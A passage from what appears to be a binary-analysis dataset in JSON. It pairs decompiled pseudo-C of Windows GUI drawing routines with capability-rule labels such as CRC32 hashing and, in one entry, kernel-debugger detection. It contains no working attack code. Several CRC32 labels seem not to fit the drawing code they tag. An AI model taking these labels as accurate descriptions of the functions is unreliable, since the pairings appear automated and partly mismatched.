+ 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x490b72 != '\\x01')) {\n            var_2ch._3_1_ = *0x490b72;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.004056d0();\n        uVar2 = fcn.004058fc(*0x4241e0);\n        fcn.004056d0(0, uVar2);\n        uVar2 = fcn.004058fc();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.004056d0();\n            fcn.0040a90c();\n        }\n        else {\n            fcn.004056d0();\n            fcn.0040a90c();\n        }\n        if (((**0x492aec == 1) && (cVar1 = fcn.0042abe4(),  cVar1 == -0x80)) && (cVar1 = fcn.00423f84(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00424328();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.00423fb0::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.0042329c(0x4241ab);\n    return;\n}\n",
        "token_count": 1155
    },
    "00424f9c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424f9c(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x425010 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040db2c();\n                fcn.00404eb4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.0042503c();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.00425068();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.00425098();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00432ecc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.00432ecc(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 219
    },
    "00434154": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434154(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x434a96;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00434210;\n        fcn.00431640();\n        cVar3 = fcn.00431748();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00434210;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.0042482c();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00431640();\n        cVar3 = fcn.00431748();\n        if (cVar3 == '\\0') {\n            fcn.0042482c();\n        }\n        else {\n            fcn.0042482c();\n        }\n        fcn.00423f70();\n        puVar2 = puStack24;\n    }\ncode_r0x00434210:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.00424bd0();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047cc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405894();\n    if (bVar9) {\n        fcn.00424bd0();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00447da8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424824();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424824();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b0b4();\n                    fcn.00424800();\n                    fcn.00424bd0();\n                }\n                else {\n                    fcn.0042482c();\n                    fcn.00424bd0();\n                }\n                fcn.0042482c();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00424c98();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00447da8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00428b88();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00429d70();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.00423f70();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.00424b24(iVar5);\n                    fcn.00423f70();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404640(0x4346f5);\n                    return;\n                }\n                fcn.00448098(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.00424ec0();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.0042482c();\n        }\n        fcn.00424bd0();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00424ec0();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00424ec0();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4914b4) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.004242fc();\n    }\n    fcn.00433efc(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00433efc(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00432f58();\n        fcn.00433efc(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.0040546c(0x434a9d);\n    return;\n}\n",
        "token_count": 4180
    },
    "00434ab4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434ab4(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x435416;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00434b70;\n        fcn.00431640();\n        cVar3 = fcn.00431748();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00434b70;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.0042482c();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00431640();\n        cVar3 = fcn.00431748();\n        if (cVar3 == '\\0') {\n            fcn.0042482c();\n        }\n        else {\n            fcn.0042482c();\n        }\n        fcn.00423f70();\n        puVar2 = puStack24;\n    }\ncode_r0x00434b70:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || ((*(lprc + -0x21) != '\\0' && (*(*(lprc + -0x38) + 0x38) == '\\0')))) {\n        fcn.00424bd0();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047cc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -8) = *(lprc + -0x18) + -1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405894();\n    if (bVar9) {\n        fcn.00424bd0();\n        *(lprc + -0x10) = *(lprc + -8) + 2;\n        *(lprc + -8) = 0;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00447da8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -0x10) = *(lprc + -8);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x10) = *(lprc + -8) + -0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -0x10) = *(lprc + -0x10) + -1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424824();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424824();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b0b4();\n                    fcn.00424800();\n                    fcn.00424bd0();\n                }\n                else {\n                    fcn.0042482c();\n                    fcn.00424bd0();\n                }\n                fcn.0042482c();\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -8) = (*(lprc + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -0x10) = *(lprc + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.00424c98();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00447da8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00428b88();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00429d70();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.00423f70();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.00424b24(iVar5);\n                    fcn.00423f70();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404640(0x43505d);\n                    return;\n                }\n                fcn.00448098(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if ((*(*(lprc + -0x38) + 0x38) != '\\0') ||\n       (((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')) && (*(lprc + -0x21) == '\\0')))) {\n        uVar7 = fcn.00424ec0();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x18) = *(lprc + -0x10) + -1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.0042482c();\n        }\n        fcn.00424bd0();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00424ec0();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00424ec0();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x18) = *(lprc + -0x10) + -1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4914b4) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.004242fc();\n    }\n    fcn.00433efc(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    *(lprc + -0x20) = *(lprc + -0x5c);\n    *(lprc + -0x18) = *(lprc + -0x54);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00433efc(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00432f58();\n        *(lprc + -0x20) = 10;\n        iVar5 = fcn.00424d1c();\n        *(lprc + -0x18) = iVar5 + *(lprc + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.00433efc(2, *(lprc + -0x29), lprc + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.0040546c(0x43541d);\n    return;\n}\n",
        "token_count": 4209
    },
    "00435434": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435434(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.00435f78();\n    iVar3 = fcn.0043558c();\n    cVar1 = fcn.0040e2f8();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.00431640(),  *(iVar4 + 5) != '\\0')) {\n        (***0x4926d0)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.004377f8(),  cVar1 != '\\0')) {\n            fcn.00434ab4(&stack0xfffffffc);\n        }\n        else {\n            fcn.00434154(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00435e40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00435e40(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.0040483c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x4360d8;\n        fcn.0040483c();\n        fcn.0041f90c();\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00436fd4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
